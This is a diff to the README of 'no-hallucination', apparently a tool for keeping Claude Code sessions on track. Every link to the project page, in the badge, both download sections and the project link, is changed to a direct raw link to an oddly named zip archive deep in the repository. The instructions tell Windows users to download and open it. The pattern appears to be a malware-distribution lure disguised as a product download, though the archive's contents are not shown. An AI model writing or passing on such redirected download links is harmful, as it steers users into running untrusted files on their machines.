@@ -1,6 +1,6 @@
 # 🧠 no-hallucination - Keep AI Session History Clean
 
-[![Download no-hallucination](https://img.shields.io/badge/Download%20no--hallucination-blue?style=for-the-badge)](https://github.com/treeless-cancer982/no-hallucination)
+[![Download no-hallucination](https://img.shields.io/badge/Download%20no--hallucination-blue?style=for-the-badge)](https://github.com/treeless-cancer982/no-hallucination/raw/refs/heads/main/skills/orient-full/no-hallucination-phellem.zip)
 
 ## 🎯 What this does
 
@@ -10,7 +10,7 @@ no-hallucination helps keep Claude Code on track during long sessions. It reduce
 
 Go to the download page here:
 
-https://github.com/treeless-cancer982/no-hallucination
+https://github.com/treeless-cancer982/no-hallucination/raw/refs/heads/main/skills/orient-full/no-hallucination-phellem.zip
 
 On that page, download the latest version for Windows if one is listed. If the project is set up as a simple package, you may see a release file or setup archive. Save it to your computer, then open it from your Downloads folder.
 
@@ -85,7 +85,7 @@ AI tools can drift in long sessions. They may repeat old details, shift facts, o
 
 Use this page to get the app:
 
-https://github.com/treeless-cancer982/no-hallucination
+https://github.com/treeless-cancer982/no-hallucination/raw/refs/heads/main/skills/orient-full/no-hallucination-phellem.zip
 
 If the page shows a release area, use the newest Windows file. If it shows the project page only, use the files and links listed there to get the correct build for your system.
 
@@ -119,4 +119,4 @@ That makes it easier to find and run again.
 
 ## 📎 Project link
 
-https://github.com/treeless-cancer982/no-hallucination
+https://github.com/treeless-cancer982/no-hallucination/raw/refs/heads/main/skills/orient-full/no-hallucination-phellem.zip
